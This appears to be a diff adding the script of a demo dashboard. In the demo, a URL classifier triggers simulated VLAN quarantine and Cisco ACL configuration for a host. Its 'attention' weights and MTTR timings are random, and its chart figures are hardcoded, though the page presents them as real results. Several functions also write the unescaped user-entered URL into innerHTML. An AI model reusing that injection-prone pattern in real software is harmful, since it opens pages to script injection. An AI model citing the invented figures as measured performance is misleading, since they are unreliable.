+    ?'Classification engine: <strong>DistilBERT live model</strong> (HuggingFace backend connected)'
+    :'Classification engine: <strong>Heuristic mode</strong> (DistilBERT backend not connected)';
+  document.getElementById('backend-badge').textContent=live?'DISTILBERT':'HEURISTIC';
+  document.getElementById('backend-badge').className='backend-mode '+(live?'live-mode':'');
+}
+
+/* ════════ MAIN CLASSIFY ════════ */
+async function classifyURL(){
+  const input=document.getElementById('url-input');
+  const url=input.value.trim();
+  if(!url){input.focus();return;}
+  const btn=document.getElementById('classify-btn');
+  const spinner=document.getElementById('spinner');
+  btn.disabled=true; spinner.classList.add('active');
+  const t0=performance.now();
+  let result;
+  if(state.backendLive){
+    result=await callBackend(url);
+    if(!result)result=heuristicClassify(url);
+  }else{
+    await new Promise(r=>setTimeout(r,180+Math.random()*120));
+    result=heuristicClassify(url);
+  }
+  const inferMs=(performance.now()-t0).toFixed(1);
+  const isMal=result.label==='malicious';
+  const mttr=isMal?(80+Math.random()*60):null;
+  btn.disabled=false; spinner.classList.remove('active');
+  updateState(isMal,mttr);
+  renderResult(url,result.label,result.confidence,inferMs,isMal,mttr);
+  runPipeline(url,result.label,result.confidence);
+  animateFlow(url,isMal,result.confidence,mttr);
+}
+
+function updateState(isMal,mttr){
+  state.totalURLs++;
+  if(isMal){state.maliciousCount++;if(mttr)state.mttrSamples.push(mttr);}
+  else{state.benignCount++;}
+  document.getElementById('m-total').textContent=state.totalURLs;
+  document.getElementById('m-mal').textContent=state.maliciousCount;
+  document.getElementById('m-ben').textContent=state.benignCount;
+  const t=state.totalURLs;
+  document.getElementById('m-mal-pct').textContent=t?((state.maliciousCount/t)*100).toFixed(1)+'% of total':'— %';
+  document.getElementById('m-ben-pct').textContent=t?((state.benignCount/t)*100).toFixed(1)+'% of total':'— %';
+  if(state.mttrSamples.length){
+    const avg=state.mttrSamples.reduce((a,b)=>a+b,0)/state.mttrSamples.length;
+    document.getElementById('m-mttr').textContent=avg.toFixed(0)+'ms';
+  }
+}
+
+function renderResult(url,label,conf,inferMs,isMal,mttr){
+  const d=DEPTS[activeDept];
+  document.getElementById('result-empty').style.display='none';
+  const card=document.getElementById('result-card');
+  card.classList.add('visible');
+  const badge=document.getElementById('result-badge');
+  badge.textContent=label.toUpperCase(); badge.className='result-badge '+label;
+  document.getElementById('result-url').textContent=url;
+  const pct=(conf*100).toFixed(1)+'%';
+  document.getElementById('conf-pct').textContent=pct;
+  document.getElementById('conf-pct').style.color=isMal?'var(--danger2)':'var(--success2)';
+  const bar=document.getElementById('conf-bar');
+  bar.style.width='0%'; bar.className='conf-bar-fill '+label;
+  setTimeout(()=>{bar.style.width=(conf*100)+'%';},50);
+  document.getElementById('infer-time').textContent=inferMs+' ms';
+  document.getElementById('infer-class').textContent=label.charAt(0).toUpperCase()+label.slice(1);
+  document.getElementById('infer-class').style.color=isMal?'var(--danger2)':'var(--success2)';
+  document.getElementById('vlan-action').textContent=isMal?'→ VLAN 999':'No action';
+  document.getElementById('vlan-action').style.color=isMal?'var(--danger2)':'var(--success2)';
+  document.getElementById('mttr-val').textContent=mttr?mttr.toFixed(0)+' ms':'—';
+  const ab=document.getElementById('action-box');
+  ab.className='action-box '+(isMal?'quarantine':'cleared');
+  document.getElementById('action-title').textContent=isMal
+    ?'⚠ Orchestrator action: VLAN isolation triggered'
+    :'✓ Orchestrator action: Traffic cleared';
+  document.getElementById('action-desc').textContent=isMal
+    ?`Host ${d.name} migrated from ${d.vlan} to VLAN 999 Quarantine. HTTP/HTTPS redirected to Remediation Server (captive portal). Lateral movement blocked. MTTR: ${mttr?mttr.toFixed(0):'—'} ms.`
+    :`URL classified as benign. No network action required. ${d.name} remains on ${d.vlan}.`;
+}
+
+/* ════════ DETECTION PIPELINE ════════ */
+function wordpieceTokens(url){
+  let u=url.replace(/^https?:\/\//,'');
+  let parts=u.split(/([\/\.\?\=\&\:\-\_\+])/).filter(x=>x.length);
+  let tokens=[];
+  parts.forEach(p=>{
+    if(/^[\/\.\?\=\&\:\-\_\+]$/.test(p)){ tokens.push({t:p,sep:true}); return; }
+    const sus = MAL_PATTERNS.some(r=>r.test(p)) || /^\d+$/.test(p) && p.length>=2;
+    if(p.length<=5){ tokens.push({t:p,sus}); }
+    else {
+      tokens.push({t:p.slice(0,4),sus});
+      for(let i=4;i<p.length;i+=4) tokens.push({t:'##'+p.slice(i,i+4),sus});
+    }
+  });
+  return tokens.slice(0,46);
+}
+
+function runPipeline(url,label,conf){
+  const isMal = label==='malicious';
+  const d=DEPTS[activeDept];
+  // reset stages
+  for(let i=1;i<=5;i++){ const s=document.getElementById('stage-'+i); s.className='pstage'; }
+  document.getElementById('pipe-stage-label').textContent='running…';
+  document.getElementById('model-pulse').setAttribute('opacity','1');
+
+  const tokenWrap=document.getElementById('token-wrap');
+  const attnBox=document.getElementById('attn-box');
+  const verdict=document.getElementById('pd-verdict');
+  tokenWrap.innerHTML=''; attnBox.innerHTML=''; verdict.innerHTML='';
+
+  const seq=[
+    ()=>{ light(1,'active'); },
+    ()=>{ done(1); light(2,'active');
+          const toks=wordpieceTokens(url);
+          toks.forEach(o=>{ const el=document.createElement('span');
+            el.className='tok'+(o.sep?' sep':'')+(o.sus?' sus':''); el.textContent=o.t; tokenWrap.appendChild(el); }); },
+    ()=>{ done(2); light(3,'active'); },
+    ()=>{ done(3); light(4, isMal?'danger':'active');
+          // attention bars for the most weighted tokens
+          const toks=wordpieceTokens(url).filter(o=>!o.sep);
+          const ranked=toks.map(o=>({t:o.t, w: o.sus?(0.7+Math.random()*0.28):(Math.random()*0.35)}))
+                           .sort((a,b)=>b.w-a.w).slice(0,4);
+          ranked.forEach(r=>{
+            const row=document.createElement('div'); row.className='attn-row';
+            row.innerHTML=`<span class="attn-tok">${r.t}</span><span class="attn-track"><span class="attn-fill"></span></span><span class="attn-val">${(r.w*100).toFixed(0)}%</span>`;
+            attnBox.appendChild(row);
+            requestAnimationFrame(()=>{ setTimeout(()=>{ row.querySelector('.attn-fill').style.width=(r.w*100)+'%'; },30); });
+          });
+    },
+    ()=>{ done(4); light(5, isMal?'danger':'done');
+          if(isMal) document.getElementById('stage-5').classList.add('danger');
+          verdict.innerHTML = isMal
+            ? `Verdict: <b style="color:var(--danger2)">MALICIOUS</b> at <b>${(conf*100).toFixed(1)}%</b>. High attention on obfuscation tokens (suspicious TLD / IP host / command keywords). Orchestrator moves <b>${d.name}</b> to <b>VLAN 999</b> and pushes a deny-ACL.`
+            : `Verdict: <b style="color:var(--success2)">BENIGN</b> at <b>${(conf*100).toFixed(1)}%</b>. No high-weight malicious sub-words. ${d.name} stays on <b>${d.vlan}</b>.`;
+          document.getElementById('pipe-stage-label').textContent='complete';
+          document.getElementById('model-pulse').setAttribute('opacity','0');
+    }
+  ];
+  const step=reduceMotion?60:300;
+  seq.forEach((fn,i)=>setTimeout(fn, step*(i+1)));
+}
+function light(n,cls){ const s=document.getElementById('stage-'+n); s.className='pstage '+cls; }
+function done(n){ document.getElementById('stage-'+n).className='pstage done'; }
+
+/* ════════ PACKET FLOW ANIMATION ════════ */
+function spawnPacket(d, color, dur, cb){
+  const layer=document.getElementById('packet-layer');
+  if(reduceMotion){ if(cb) setTimeout(cb, 120); return; }
+  const c=document.createElementNS(SVGNS,'circle');
+  c.setAttribute('r','4'); c.setAttribute('fill',color); c.setAttribute('class','packet');
+  const m=document.createElementNS(SVGNS,'animateMotion');
+  m.setAttribute('dur',dur+'s'); m.setAttribute('path',d);
+  m.setAttribute('fill','freeze'); m.setAttribute('begin','0s'); m.setAttribute('rotate','0');
+  c.appendChild(m); layer.appendChild(c);
+  setTimeout(()=>{ c.remove(); if(cb)cb(); }, dur*1000);
+}
+function pcToCorePath(d){ return `M ${d.pcx},${d.pcTop} L ${d.pcx},${d.swy} L 520,241`; }
+function outboundPath(d){ return `M ${d.pcx},${d.pcTop} L ${d.pcx},${d.swy} L 520,241 L 520,193 L 520,151 L 520,118 L 520,64`; }
+function responsePath(d){ return `M 520,64 L 520,118 L 520,151 L 520,193 L 520,241 L ${d.pcx},${d.swy} L ${d.pcx},${d.pcTop}`; }
+function mirrorPath(){ return 'M 540,232 L 790,232 L 790,200 L 810,178'; }
+function quarantinePath(d){ return `M ${d.pcx},${d.pcTop} L ${d.pcx},${d.swy} L 545,250 Q 720,275 905,338 L 910,416`; }
+function restorePath(d){ return `M 910,416 L 905,338 Q 720,275 545,250 L ${d.pcx},${d.swy} L ${d.pcx},${d.pcTop}`; }
+
+function animateFlow(url,isMal,conf,mttr){
+  const d=DEPTS[activeDept];
+  // 1. outbound request from the PC
+  spawnPacket(outboundPath(d), '#60a5fa', 1.1);
+  // 2. mirrored copy to the model on the Management Server
+  document.getElementById('mirror-link').classList.add('visible');
+  setTimeout(()=>spawnPacket(mirrorPath(), '#a78bfa', 0.9, ()=>{
+    setTimeout(()=>document.getElementById('mirror-link').classList.remove('visible'), 1200);
+  }), 350);
+
+  if(isMal){
+    // 3. quarantine migration of the host
+    setTimeout(()=>{
+      triggerQuarantine(url,conf,mttr);
+      spawnPacket(quarantinePath(d), '#f472b6', 1.3);
+    }, 1500);
+  }else{
+    // 3. allowed response returns to the PC
+    setTimeout(()=>spawnPacket(responsePath(d), '#86efac', 1.1, ()=>{
+      setEndpoint('benign', url);
+      addLog('ben','Benign URL cleared. No network action required.',url);
+    }), 1300);
+  }
+}
+
+/* ════════ QUARANTINE ════════ */
+function triggerQuarantine(url,conf,mttr){
+  const d=DEPTS[activeDept];
+  d.quarantined=true;
+  document.getElementById('topo-state-label').textContent='🔴 '+d.name+' quarantined';
+  document.getElementById('topo-state-label').style.color='var(--danger2)';
+  document.getElementById(d.zone).classList.add('infected');
+  const pr=document.getElementById(d.pcRect);
+  pr.style.fill='rgba(239,68,68,0.2)'; pr.style.stroke='#ef4444';
+  document.getElementById('qnt-link').classList.add('visible');
+  document.getElementById('infected-host').style.opacity='1';
+  document.getElementById(d.tip).classList.add('visible');
+  document.getElementById('zone-qnt').classList.add('active');
+  document.getElementById('reset-hint').style.opacity='1';
+  setEndpoint('quarantine', url);
+  addLog('mal',`Malicious URL detected (conf: ${(conf*100).toFixed(1)}%). ${d.name} migrated from ${d.vlan} to VLAN 999 Quarantine. Walled garden active. MTTR ${mttr?mttr.toFixed(0):'—'} ms.`,url);
+  addLog('qnt',`Remediation Server redirect active. All traffic from ${d.name} restricted to captive portal only.`);
+  // push the isolation config to the Cisco appliances
+  setOrchStatus('bad', `Isolated — ${d.name} → VLAN 999 (deny-ACL active)`);
+  document.getElementById('restore-btn').disabled=false;
+  writeConsole(quarantineConfig(d));
+}
+
+/* ════════ ORCHESTRATION CONSOLE / CONFIG ════════ */
+function quarantineConfig(d){
+  return [
+    {cls:'c-orch', t:`[orchestrator] SSH 10.100.0.10 → ${d.sw} (${d.swModel})`},
+    {cls:'c-cmd',  t:`${d.sw}# configure terminal`},
+    {cls:'c-cmd',  t:`${d.sw}(config)# interface ${d.iface}`},
+    {cls:'c-warn', t:`${d.sw}(config-if)#  switchport access vlan ${QNT_VLAN}`},
+    {cls:'c-cmd',  t:`${d.sw}(config-if)#  description QUARANTINE-AUTO (${d.name} / ${d.ip})`},
+    {cls:'c-cmd',  t:`${d.sw}(config-if)#  spanning-tree portfast`},
+    {cls:'c-cmd',  t:`${d.sw}(config-if)# end`},
+    {cls:'c-cmd',  t:`${d.sw}# write memory`},
+    {cls:'c-orch', t:`[orchestrator] SSH 10.100.0.20 → ${ASA} (${ASA_MODEL})`},
+    {cls:'c-cmd',  t:`${ASA}# configure terminal`},
+    {cls:'c-deny', t:`${ASA}(config)# access-list QUARANTINE_BLOCK extended deny ip host ${d.ip} any`},
+    {cls:'c-ok',   t:`${ASA}(config)# access-list QUARANTINE_BLOCK extended permit ip host ${d.ip} host ${REMED_IP}`},
+    {cls:'c-cmd',  t:`${ASA}(config)# access-group QUARANTINE_BLOCK in interface quarantine`},
+    {cls:'c-cmd',  t:`${ASA}# end`},
+    {cls:'c-orch', t:`[orchestrator] ✓ ${d.name} isolated in VLAN ${QNT_VLAN} — lateral movement denied`}
+  ];
+}
+function restoreConfig(d){
+  return [
+    {cls:'c-orch', t:`[orchestrator] verification scan clean → restoring ${d.name}`},
+    {cls:'c-cmd',  t:`${d.sw}# configure terminal`},
+    {cls:'c-cmd',  t:`${d.sw}(config)# interface ${d.iface}`},
+    {cls:'c-ok',   t:`${d.sw}(config-if)#  switchport access vlan ${d.vlanId}`},
+    {cls:'c-cmd',  t:`${d.sw}(config-if)#  no description`},
+    {cls:'c-cmd',  t:`${d.sw}(config-if)# end`},
+    {cls:'c-cmd',  t:`${d.sw}# write memory`},
+    {cls:'c-cmd',  t:`${ASA}# configure terminal`},
+    {cls:'c-ok',   t:`${ASA}(config)# no access-list QUARANTINE_BLOCK`},
+    {cls:'c-cmd',  t:`${ASA}# end`},
+    {cls:'c-orch', t:`[orchestrator] ✓ ${d.name} returned to ${d.vlan} — self-healing complete`}
+  ];
+}
+function setOrchStatus(kind, msg){
+  const b=document.getElementById('orch-status');
+  b.textContent=msg; b.className='orch-badge '+(kind||'');
+}
+function writeConsole(lines, cb){
+  const term=document.getElementById('orch-terminal');
+  const step=reduceMotion?0:90;
+  lines.forEach((ln,i)=>{
+    setTimeout(()=>{
+      const div=document.createElement('div');
+      div.className='term-line '+ln.cls;
+      div.textContent=ln.t;
+      term.appendChild(div);
+      term.scrollTop=term.scrollHeight;
+      if(i===lines.length-1 && cb) cb();
+    }, step*i);
+  });
+  if(reduceMotion && cb) cb();
+}
+function clearConsole(){
+  document.getElementById('orch-terminal').innerHTML='<div class="term-line c-muted"># Console cleared. Orchestrator standing by.</div>';
+}
+
+/* ════════ VERIFY & RESTORE (self-healing close) ════════ */
+function restoreHost(){
+  const d=DEPTS[activeDept];
+  if(!d.quarantined) return;
+  document.getElementById('restore-btn').disabled=true;
+  setOrchStatus('', `Verifying ${d.name}…`);
+  addLog('sys',`Verification re-scan requested for ${d.name}. Confirming host is clean before restore.`);
+  writeConsole(restoreConfig(d), ()=>{
+    spawnPacket(restorePath(d), '#86efac', 1.3, ()=>{
+      // clear this department's quarantine state
+      d.quarantined=false;
+      document.getElementById(d.zone).classList.remove('infected');
+      const pr=document.getElementById(d.pcRect);
+      pr.style.fill=''; pr.style.stroke='#38bdf8';
+      document.getElementById(d.tip).classList.remove('visible');
+      const anyQ=['eng','fin','hr'].some(k=>DEPTS[k].quarantined);
+      if(!anyQ){
+        document.getElementById('qnt-link').classList.remove('visible');
+        document.getElementById('infected-host').style.opacity='0.3';
+        document.getElementById('zone-qnt').classList.remove('active');
+        document.getElementById('reset-hint').style.opacity='0';
+        document.getElementById('topo-state-label').textContent='All clear';
+        document.getElementById('topo-state-label').style.color='var(--success2)';
+      }
+      setEndpoint('idle');
+      setOrchStatus('ok', `Restored — ${d.name} back on ${d.vlan}`);
+      addLog('sys',`✓ Self-healing complete. ${d.name} restored to ${d.vlanFull}. Deny-ACL removed.`);
+    });
+  });
+}
+
+function resetTopology(silent){
+  ['eng','fin','hr'].forEach(k=>{
+    const d=DEPTS[k];
+    d.quarantined=false;
+    document.getElementById(d.zone).classList.remove('infected');
+    const pr=document.getElementById(d.pcRect);
+    pr.style.fill=''; pr.style.stroke='#38bdf8';
+    document.getElementById(d.tip).classList.remove('visible');
+  });
+  document.getElementById('topo-state-label').textContent='All clear';
+  document.getElementById('topo-state-label').style.color='var(--success2)';
+  document.getElementById('qnt-link').classList.remove('visible');
+  document.getElementById('mirror-link').classList.remove('visible');
+  document.getElementById('infected-host').style.opacity='0.3';
+  document.getElementById('zone-qnt').classList.remove('active');
+  document.getElementById('reset-hint').style.opacity='0';
+  document.getElementById('packet-layer').innerHTML='';
+  document.getElementById('restore-btn').disabled=true;
+  setOrchStatus('', 'Idle — no action pushed');
+  if(!silent){
+    setEndpoint('idle');
+    addLog('sys',`Topology reset. ${DEPTS[activeDept].name} returned to ${DEPTS[activeDept].vlan}. Quarantine lifted.`);
+  }
+}
+
+/* ════════ ENDPOINT (PC) SCREEN ════════ */
+function normalPageHTML(url){
+  const host = url ? url.replace(/^https?:\/\//,'').split('/')[0] : 'intranet.acme.local';
+  return `
+    <div class="intra-top">
+      <div class="intra-logo">A</div>
+      <div class="intra-name">Acme Corp <span>· ${host}</span></div>
+    </div>
+    <div class="intra-search">🔎  Search the company portal…</div>
+    <div class="intra-tiles">
+      <div class="intra-tile"><div class="tile-ico">📧</div><div class="tile-t">Webmail</div></div>
+      <div class="intra-tile"><div class="tile-ico">📁</div><div class="tile-t">Files</div></div>
+      <div class="intra-tile"><div class="tile-ico">📅</div><div class="tile-t">Calendar</div></div>
+      <div class="intra-tile"><div class="tile-ico">💬</div><div class="tile-t">Chat</div></div>
+      <div class="intra-tile"><div class="tile-ico">🎫</div><div class="tile-t">Helpdesk</div></div>
+      <div class="intra-tile"><div class="tile-ico">📊</div><div class="tile-t">Reports</div></div>
+    </div>
+    <div class="intra-foot"><span class="fdot"></span> Page loaded · connection allowed by the orchestrator</div>`;
+}
+function walledGardenHTML(d, url){
+  return `
+    <div class="wall">
+      <div class="wall-shield">🛡️</div>
+      <div class="wall-h">Access blocked — host quarantined</div>
+      <div class="wall-sub">This device tried to reach a site flagged as <b style="color:var(--danger2)">malicious</b> and has been isolated automatically.</div>
+      <div class="wall-card">
+        <div class="wall-row"><span class="k">Blocked URL</span><span class="v red" style="max-width:200px;overflow:hidden;text-overflow:ellipsis">${url||'—'}</span></div>
+        <div class="wall-row"><span class="k">Reason</span><span class="v">DistilBERT: malicious</span></div>
+        <div class="wall-row"><span class="k">Device</span><span class="v">${d.name}</span></div>
+        <div class="wall-row"><span class="k">Moved to</span><span class="v red">VLAN 999 Quarantine</span></div>
+      </div>
+      <div class="wall-steps">
+        <b>What to do next</b><br>
+        • Your internet and internal access are suspended.<br>
+        • An IT remediation ticket has been opened automatically.<br>
+        • Contact the Help Desk to clear this device.
+      </div>
+      <div class="wall-served">Captive portal served by the Remediation Server · controlled from VLAN 100 Management.</div>
+    </div>`;
+}
+function setEndpoint(mode, url){
+  const d=DEPTS[activeDept];
+  const addr=document.getElementById('ep-url');
+  const lock=document.getElementById('ep-lock');
+  const body=document.getElementById('ep-body');
+  const badge=document.getElementById('ep-badge');
+  const stateLbl=document.getElementById('ep-state-label');
+  document.getElementById('ep-host').textContent=d.name;
+  document.getElementById('ep-x-host').textContent=d.name;
+  document.getElementById('ep-x-vlan').textContent=d.vlanFull;
+  document.getElementById('ep-x-gw').textContent=d.gw;
+
+  if(mode==='quarantine'){
+    addr.textContent=url||'http://10.99.0.1/remediation'; addr.className='ep-url blocked';
+    lock.textContent='⛔';
+    badge.textContent='Blocked'; badge.className='ep-badge bad';
+    body.className='ep-body walled'; body.innerHTML=walledGardenHTML(d,url);
+    stateLbl.textContent='Walled garden (quarantined)'; stateLbl.style.color='var(--danger2)';
+    document.getElementById('ep-x-net').textContent='Suspended';
+    document.getElementById('ep-x-net').className='v red';
+    document.getElementById('ep-x-vlan').textContent='VLAN 999 (Quarantine)';
+    document.getElementById('ep-x-gw').textContent='10.99.0.1';
+    document.getElementById('ep-explain').innerHTML=`<b>${d.name}</b> is now boxed into the quarantine VLAN. Its browser can only reach the remediation captive portal — every other destination is dropped by the pushed ACL. Lateral movement to other departments is cut off.`;
+  } else if(mode==='benign'){
+    addr.textContent=url||'https://intranet.acme.local/home'; addr.className='ep-url';
+    lock.textContent='🔒';
+    badge.textContent='Allowed'; badge.className='ep-badge ok';
+    body.className='ep-body normal'; body.innerHTML=normalPageHTML(url);
+    stateLbl.textContent='Normal browsing'; stateLbl.style.color='var(--success2)';
+    document.getElementById('ep-x-net').textContent='Allowed'; document.getElementById('ep-x-net').className='v';
+    document.getElementById('ep-explain').innerHTML=`The URL came back <b style="color:var(--success2)">benign</b>, so the orchestrator took no action. <b>${d.name}</b> keeps browsing normally on ${d.vlan}.`;
+  } else {
+    addr.textContent='https://intranet.acme.local/home'; addr.className='ep-url';
+    lock.textContent='🔒';
+    badge.textContent='Secure'; badge.className='ep-badge ok';
+    body.className='ep-body normal'; body.innerHTML=normalPageHTML();
+    stateLbl.textContent='Normal browsing'; stateLbl.style.color='var(--success2)';
+    document.getElementById('ep-x-net').textContent='Allowed'; document.getElementById('ep-x-net').className='v';
+    document.getElementById('ep-explain').innerHTML=`The endpoint browses normally on its department VLAN. Run a <b>malicious</b> URL to watch the screen flip to the captive "walled garden" the instant the host is quarantined.`;
+  }
+}
+
+/* ════════ LOG ════════ */
+function addLog(type,msg,url){
+  const log=document.getElementById('event-log');
+  const entry=document.createElement('div');
+  entry.className='log-entry';
+  const now=new Date().toLocaleTimeString('en-US',{hour12:false});
+  const dotClass=type==='mal'?'mal':type==='ben'?'ben':type==='qnt'?'qnt':'sys';
+  entry.innerHTML=`<span class="log-time">${now}</span><div class="log-dot ${dotClass}"></div><span class="log-text">${msg}${url?`<br><span class="url">${url}</span>`:''}</span>`;
+  log.insertBefore(entry,log.firstChild);
+}
+function clearLog(){
+  document.getElementById('event-log').innerHTML='';
+  addLog('sys','Log cleared.');
+}
+
+/* ════════ CHART ════════ */
+function chartColors(){
+  const light = document.documentElement.dataset.theme==='light';
+  return { tick: light?'#475569':'#64748b', grid: light?'rgba(15,23,42,0.06)':'rgba(255,255,255,0.04)' };
+}
+function buildMTTRChart(){
+  const c=chartColors();
+  window.__mttrChart=new Chart(document.getElementById('mttr-chart'),{
+    type:'bar',
+    data:{
+      labels:['Detection','Alert triage','VLAN migration','Verification','Total MTTR'],
+      datasets:[
+        {label:'Automated SLM (ms)',data:[45,20,85,30,180],backgroundColor:'rgba(59,130,246,0.7)',borderColor:'#3b82f6',borderWidth:1,borderRadius:3},
+        {label:'Manual SOC (s→ms)',data:[120000,300000,480000,240000,900000],backgroundColor:'rgba(100,116,139,0.5)',borderColor:'#64748b',borderWidth:1,borderRadius:3}
+      ]
+    },
+    options:{
+      responsive:true,maintainAspectRatio:false,
+      plugins:{legend:{display:false},tooltip:{callbacks:{label:(ctx)=>{const v=ctx.raw;return ctx.datasetIndex===0?`Automated: ${v} ms`:`Manual: ~${(v/1000).toFixed(0)}s (~${(v/60000).toFixed(1)} min)`;}}}},
+      scales:{
+        x:{ticks:{color:c.tick,font:{size:10},maxRotation:25},grid:{color:c.grid}},
+        y:{type:'logarithmic',ticks:{color:c.tick,font:{size:10},callback:v=>v>=1000?(v/1000).toFixed(0)+'s':v+'ms'},grid:{color:c.grid}}
+      }
+    }
+  });
+}
+function restyleChart(){
+  const c=chartColors();
+  const ch=window.__mttrChart;
+  ch.options.scales.x.ticks.color=c.tick; ch.options.scales.x.grid.color=c.grid;
+  ch.options.scales.y.ticks.color=c.tick; ch.options.scales.y.grid.color=c.grid;
+  ch.update();
+}
+
+function startClock(){
+  const tick=()=>document.getElementById('clock').textContent=new Date().toLocaleTimeString('en-US',{hour12:false});
+  tick(); setInterval(tick,1000);
+}
+
+buildSamples(); buildMTTRChart(); startClock(); setEndpoint('idle');
+</script>
+</body>
+</html>
